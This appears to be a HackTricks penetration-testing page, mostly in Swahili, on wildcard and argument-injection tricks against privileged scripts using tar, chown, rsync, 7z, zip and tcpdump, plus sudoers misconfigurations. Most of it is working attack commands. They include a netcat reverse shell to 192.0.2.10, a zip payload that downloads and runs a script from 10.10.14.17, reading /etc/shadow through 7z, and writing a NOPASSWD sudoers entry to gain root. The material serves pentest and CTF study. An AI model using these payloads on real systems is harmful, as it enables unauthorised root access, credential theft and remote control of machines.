# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** hutokea wakati script yenye ruhusa inaendesha binary ya Unix kama `tar`, `chown`, `rsync`, `zip`, `7z`, … na wildcard isiyokuwa imekatwa (unquoted) kama `*`.
> Kwa kuwa shell inapanua wildcard **kabla** ya kuendesha binary, mshambuliaji ambaye anaweza kuunda faili katika directory ya kazi anaweza kutengeneza majina ya faili yanayoanza na `-` ili yatambulike kama **chaguzi badala ya data**, kwa ufanisi kubembeza bendera yoyote au hata amri.
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa hivi karibuni na utambuzi wa kisasa kwa 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wakati root baadaye anapotekeleza kitu kama:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` imeingizwa, ikasababisha *faili zote* zinazolingana kurithi umiliki/uruhusi wa `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Tazama pia karatasi ya klasiki ya DefenseCode kwa maelezo.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Tekeleza amri za hiari kwa kutumia vibaya kipengele cha **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Mara root anapoendesha kwa mfano `tar -czf /root/backup.tgz *`, `shell.sh` huendeshwa kama root.

### bsdtar / macOS 14+

The default `tar` on recent macOS (based on `libarchive`) *haitekelezi* `--checkpoint`, lakini bado unaweza kufikia code-execution kwa bendera **--use-compress-program** ambayo inakuwezesha kutaja compressor wa nje.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wakati privileged script inapoendesha `tar -cf backup.tar *`, `/bin/sh` itaanzishwa.

---

## rsync

`rsync` inakuwezesha kubadilisha remote shell au hata remote binary kupitia command-line flags zinazoanza na `-e` au `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ikiwa root baadaye atafanya archive ya saraka hiyo kwa `rsync -az * backup:/srv/`, flag uliyoingiza itazindua shell yako upande wa mbali.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Hata pale script yenye ruhusa za juu, kwa kujilinda, inaweka kabla wildcard na `--` (kuzuia option parsing), muundo wa 7-Zip unaunga mkono **file list files** kwa kuweka awali jina la faili kwa `@`. Kuchanganya hilo na symlink kunakuwezesha *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ikiwa root anatekeleza kitu kama:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama orodha ya faili na itakoma, **ikichapisha yaliyomo kwenye stderr**.

---

## zip

Kuna mbinu mbili za vitendo zinazopatikana wakati programu inapitisha majina ya faili yanayodhibitiwa na mtumiaji kwa `zip` (iwe kupitia wildcard au kwa kuorodhesha majina bila `--`).

- RCE via test hook: `-T` inawasha “test archive” na `-TT <cmd>` inabadilisha tester na programu yoyote (fomu ndefu: `--unzip-command <cmd>`). Ikiwa unaweza kuingiza majina ya faili yanayoanza na `-`, gawanya flags kwenye majina tofauti ya faili ili short-options parsing ifanye kazi:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Vidokezo
- Usijaribu jina la faili moja kama `'-T -TT <cmd>'` — short options zinachambuliwa kwa kila herufi na itashindwa. Tumia tokens tofauti kama ilivyoonyeshwa.
- Ikiwa slashes zinakatwa kutoka kwa majina ya faili na app, pakua kutoka kwa host/IP tupu (default path `/index.html`) na hifadhi ndani kwa `-O`, kisha endesha.
- Unaweza kutatua uchambuzi kwa `-sc` (show processed argv) au `-h2` (more help) ili kuelewa jinsi token zako zinavyotumika.

Mfano (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ikiwa tabaka la wavuti linarudisha `zip` stdout/stderr (kawaida na wrappers za mgeni), vilivyoingizwa vya flag kama `--help` au kushindwa kwa chaguo mbaya vitaonekana katika jibu la HTTP, kuthibitisha command-line injection na kusaidia kurekebisha payload.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Amri zifuatazo zimekuwa zikitumika vibaya katika CTFs za kisasa na mazingira halisi. Payload huundwa kila wakati kama *filename* ndani ya saraka inayoweza kuandikwa ambayo baadaye itashughulikiwa na wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Soma yaliyomo ya faili |
| `flock` | `-c <cmd>` | Tekeleza amri |
| `git`   | `-c core.sshCommand=<cmd>` | Utekelezaji wa amri kupitia git juu ya SSH |
| `scp`   | `-S <cmd>` | Anzisha programu yoyote badala ya ssh |

Vyanzo hivi haviko kawaida kama zile za *tar/rsync/zip* za jadi, lakini vinastahili kuangalia unapokuwa ukitafuta.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wakati restricted shell au vendor wrapper inajenga mstari wa amri wa `tcpdump` kwa kuunganisha viwanja vinavyodhibitiwa na mtumiaji (kwa mfano, parameta ya "file name") bila kunukuu/kuhakiki kwa ukali, unaweza kusafirisha siri flag za ziada za `tcpdump`. Mchanganyiko wa `-G` (zungushaji kwa msingi wa wakati), `-W` (kudhibiti idadi ya faili), na `-z <cmd>` (amri baada ya rotation) hutolewa utekelezaji wowote wa amri kama mtumiaji anayekimbiza tcpdump (mara nyingi root kwenye appliances).

Masharti ya awali:

- Unaweza kuathiri `argv` inayopitishwa kwa `tcpdump` (mfano, kupitia wrapper kama `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper haisafishi nafasi au tokens zilizo na prefix `-` katika uwanja wa file name.

Classic PoC (inayotekeleza script ya reverse shell kutoka kwenye njia inayoweza kuandikwa):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` inalazimisha rotate mara moja baada ya pakiti ya kwanza inayolingana.
- `-z <cmd>` inaendesha amri ya post-rotate mara moja kwa kila rotation. Majengo mengi hutekeleza `<cmd> <savefile>`. Ikiwa `<cmd>` ni script/interpreter, hakikisha jinsi ya kushughulikia vigezo inafanana na payload yako.

No-removable-media variants:

- Ikiwa una primitive nyingine ya kuandika faili (mfano, command wrapper tofauti inayoruhusu output redirection), weka script yako kwenye njia inayojulikana na chochea `-z /bin/sh /path/script.sh` au `-z /path/script.sh` kulingana na semantics za jukwaa.
- Baadhi ya vendor wrappers hufanya rotate kwenda maeneo yanayoweza kudhibitiwa na attacker. Ikiwa unaweza kuathiri njia iliyozungushwa (symlink/directory traversal), unaweza kuelekeza `-z` ili itekeleze maudhui unayodhibiti kikamilifu bila vyombo vya nje.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Matatizo
- `*` glob na patterns zinazoruhusu zinaweka vikwazo tu kwa hoja ya kwanza ya `-w`. `tcpdump` inakubali chaguzi nyingi za `-w`; chaguo la mwisho ndilo linatumika.
- Kanuni haizuizi chaguzi nyingine, hivyo `-Z`, `-r`, `-V`, n.k. zinaruhusiwa.

Mbinu za msingi
- Badilisha njia ya kusudi kwa `-w` ya pili (ya kwanza inatimiza tu masharti ya sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal ndani ya `-w` ya kwanza ili kutoroka mti uliokandamizwa:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lazimisha umiliki wa matokeo kwa `-Z root` (huunda faili zenye umiliki wa root mahali popote):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Uandishi wa maudhui yoyote kwa kurudia PCAP iliyotengenezwa kupitia `-r` (kwa mfano, kuongeza mstari wa sudoers):

<details>
<summary>Tengeneza PCAP inayojumuisha payload ya ASCII kamili na uiandike kama root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (inafsiri orodha ya savefiles). Uchunguzi wa makosa mara nyingi hurudisha mistari, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Marejeo

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
